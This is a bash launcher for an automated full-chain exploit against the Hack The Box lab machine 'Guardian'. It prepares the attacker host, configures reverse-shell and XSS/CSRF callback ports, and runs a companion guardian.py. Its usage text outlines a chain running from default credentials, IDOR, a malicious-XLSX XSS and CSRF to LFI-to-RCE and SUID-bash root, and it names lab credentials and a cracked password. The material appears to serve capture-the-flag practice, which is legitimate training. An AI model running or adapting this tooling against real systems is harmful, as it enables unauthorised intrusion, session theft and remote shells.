#!/usr/bin/env bash
# ╔══════════════════════════════════════════════════════════╗
# ║  HTB Guardian Full Chain Exploit Launcher              ║
# ║  Usage: ./guardian.sh <TARGET_IP> [LHOST] [--yes]        ║
# ╚══════════════════════════════════════════════════════════╝

set -euo pipefail

TARGET="${1:-}"
LHOST_ARG="${2:-}"
AUTO_YES="${GUARDIAN_AUTO_YES:-0}"
if [[ "${3:-}" == "--yes" || "${3:-}" == "-y" ]]; then
    AUTO_YES="1"
fi
SCRIPT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
EXPLOIT_PY="${SCRIPT_DIR}/guardian.py"

# ── Color codes ──────────────────────────────────────────────────────────────
RED='\033[0;31m'; GRN='\033[0;32m'; YLW='\033[0;33m'
BLU='\033[0;34m'; CYN='\033[0;36m'; RST='\033[0m'; BOLD='\033[1m'

err()  { echo -e "${RED}[-]${RST} $*" >&2; }
ok()   { echo -e "${GRN}[+]${RST} $*"; }
info() { echo -e "${BLU}[*]${RST} $*"; }
warn() { echo -e "${YLW}[!]${RST} $*"; }

# ── Validate usage ───────────────────────────────────────────────────────────
if [[ -z "$TARGET" ]]; then
    echo -e "${CYN}${BOLD}HTB Guardian Full Chain Automated Exploit${RST}"
    echo ""
    echo "Usage:   ./guardian.sh <TARGET_IP> [LHOST]"
    echo "Example: ./guardian.sh 10.10.11.84 10.10.14.250 --yes"
    echo "Env:     GUARDIAN_AUTO_YES=1 ./guardian.sh <TARGET_IP> [LHOST]"
    echo "Env:     GUARDIAN_XSS_PORTS=80,8888,8088 GUARDIAN_CSRF_PORTS=80,8080,8000"
    echo ""
    echo "Attack chain:"
    echo "  1.  Recon         → portal + gitea subdomains"
    echo "  2.  Default creds → GU0142023:GU1234"
    echo "  3.  IDOR          → chat user enumeration → Gitea creds"
    echo "  4.  Gitea         → source code → DB root + salt"
    echo "  5.  XSS           → CVE-2024-56409 malicious XLSX → lecturer cookie"
    echo "  6.  CSRF          → token reuse → admin account"
    echo "  7.  LFI→RCE       → PHP filter chain → www-data shell"
    echo "  8.  MySQL+crack   → SHA256 hash → jamil:copperhouse56"
    echo "  9.  status.py     → admins group write → mark shell"
    echo "  10. LoadModule    → safeapache2ctl flaw → SUID bash → root"
    exit 1
fi

# ── Validate IP format ───────────────────────────────────────────────────────
if ! [[ "$TARGET" =~ ^[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}\.[0-9]{1,3}$ ]]; then
    err "Invalid IP address: $TARGET"
    exit 1
fi

# ── Check Python 3 ───────────────────────────────────────────────────────────
if ! command -v python3 &>/dev/null; then
    err "python3 not found. Install Python 3.10+."
    exit 1
fi

PYTHON_VER=$(python3 -c 'import sys; print(sys.version_info.minor)')
if [[ "$PYTHON_VER" -lt 10 ]]; then
    warn "Python 3.10+ recommended (found 3.${PYTHON_VER})"
fi

# ── Check/install Python dependencies ────────────────────────────────────────
info "Checking Python dependencies..."

MISSING_PKGS=()
python3 -c "import requests"   2>/dev/null || MISSING_PKGS+=("requests")
python3 -c "import openpyxl"   2>/dev/null || MISSING_PKGS+=("openpyxl")

if [[ ${#MISSING_PKGS[@]} -gt 0 ]]; then
    warn "Missing packages: ${MISSING_PKGS[*]}"
    info "Installing via pip..."
    if command -v pip3 &>/dev/null; then
        pip3 install "${MISSING_PKGS[@]}" --break-system-packages -q \
            || pip3 install "${MISSING_PKGS[@]}" -q \
            || { err "pip install failed. Run manually: pip3 install ${MISSING_PKGS[*]}"; exit 1; }
    else
        err "pip3 not found. Install: ${MISSING_PKGS[*]}"
        exit 1
    fi
fi
ok "Dependencies satisfied."

# ── Check if exploit script exists ───────────────────────────────────────────
if [[ ! -f "$EXPLOIT_PY" ]]; then
    err "guardian.py not found at: $EXPLOIT_PY"
    err "Ensure guardian.py is in the same directory as guardian.sh"
    exit 1
fi

# ── Check for /etc/hosts update ──────────────────────────────────────────────
HOSTS_FILE="/etc/hosts"
if ! grep -q "guardian.htb" "$HOSTS_FILE" 2>/dev/null; then
    warn "guardian.htb not in /etc/hosts"
    if [[ "$EUID" -eq 0 ]]; then
        info "Adding vhosts to /etc/hosts..."
        echo "${TARGET}  guardian.htb portal.guardian.htb gitea.guardian.htb" >> "$HOSTS_FILE"
        ok "Added to /etc/hosts"
    else
        info "Run the following to add vhosts (requires sudo):"
        echo -e "    ${CYN}echo '${TARGET}  guardian.htb portal.guardian.htb gitea.guardian.htb' | sudo tee -a /etc/hosts${RST}"
        echo ""
        read -rp "Continue anyway? [y/N] " REPLY
        [[ "$REPLY" =~ ^[Yy]$ ]] || exit 0
    fi
else
    ok "Virtual hosts already in /etc/hosts"
fi

# ── Detect/override LHOST ────────────────────────────────────────────────────
LHOST="$LHOST_ARG"
if [[ -z "$LHOST" ]]; then
    if ip addr show tun0 &>/dev/null 2>&1; then
        LHOST=$(ip addr show tun0 | grep -oP 'inet \K[\d.]+')
    fi
    if [[ -z "$LHOST" ]]; then
        LHOST=$(ip route get "$TARGET" 2>/dev/null | grep -oP 'src \K[\d.]+' | head -1)
    fi
    if [[ -z "$LHOST" ]]; then
        LHOST=$(hostname -I | awk '{print $1}')
    fi
fi

ok "LHOST detected: ${LHOST}"

# ── Default multi-port callback profiles (override if needed) ───────────────
export GUARDIAN_XSS_PORTS="${GUARDIAN_XSS_PORTS:-80,8888,8088,18080}"
export GUARDIAN_CSRF_PORTS="${GUARDIAN_CSRF_PORTS:-80,8080,8000,18080}"
export GUARDIAN_WWW_SHELL_PORTS="${GUARDIAN_WWW_SHELL_PORTS:-4444,443,80,8081}"
export GUARDIAN_MARK_SHELL_PORTS="${GUARDIAN_MARK_SHELL_PORTS:-4445,80,8082,443}"
info "XSS callback ports preference: ${GUARDIAN_XSS_PORTS}"
info "CSRF server ports preference: ${GUARDIAN_CSRF_PORTS}"
info "www-data shell ports preference: ${GUARDIAN_WWW_SHELL_PORTS}"
info "mark shell ports preference: ${GUARDIAN_MARK_SHELL_PORTS}"

# ── Check required ports are free ────────────────────────────────────────────
PORTS=(80 8888 8080 4444 4445)
PORT_NAMES=("web-callback" "XSS-listener" "CSRF-server" "www-shell" "mark-shell")
PORT_OK=true

for i in "${!PORTS[@]}"; do
    PORT="${PORTS[$i]}"
    NAME="${PORT_NAMES[$i]}"
    if ss -tlnp 2>/dev/null | grep -Eq "[[:space:]][^[:space:]]*:${PORT}[[:space:]]"; then
        if [[ "$PORT" == "80" ]]; then
            warn "Port 80 (${NAME}) is in use. External bot callbacks often require 80; exploit reliability may drop."
        elif [[ "$PORT" == "8888" || "$PORT" == "8080" ]]; then
            warn "Port ${PORT} (${NAME}) is already in use. guardian.py will auto-select a nearby free port."
        else
            warn "Port ${PORT} (${NAME}) is already in use!"
            PORT_OK=false
        fi
    else
        ok "Port ${PORT} (${NAME}) is free."
    fi
done

if [[ "$PORT_OK" == "false" ]]; then
    warn "Some ports are in use. The exploit may fail."
    if [[ "$AUTO_YES" == "1" ]]; then
        warn "Auto-yes enabled, continuing despite busy shell ports."
    else
        read -rp "Continue anyway? [y/N] " REPLY
        [[ "$REPLY" =~ ^[Yy]$ ]] || exit 0
    fi
fi

# ── Pre-flight summary ────────────────────────────────────────────────────────
echo ""
echo -e "${CYN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo -e "${CYN}${BOLD}  TARGET:   ${TARGET}${RST}"
echo -e "${CYN}${BOLD}  LHOST:    ${LHOST}${RST}"
echo -e "${CYN}${BOLD}  EXPLOIT:  guardian.py (HTB Guardian Full Chain)${RST}"
echo -e "${CYN}${BOLD}━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${RST}"
echo ""
if [[ "$AUTO_YES" == "1" ]]; then
    CONFIRM="y"
else
    read -rp "Launch exploit? [y/N] " CONFIRM
fi
[[ "$CONFIRM" =~ ^[Yy]$ ]] || { info "Aborted."; exit 0; }

# ── Run the exploit ───────────────────────────────────────────────────────────
echo ""
ok "Launching guardian.py against $TARGET ..."
echo ""

exec python3 -u "$EXPLOIT_PY" "$TARGET" "$LHOST"
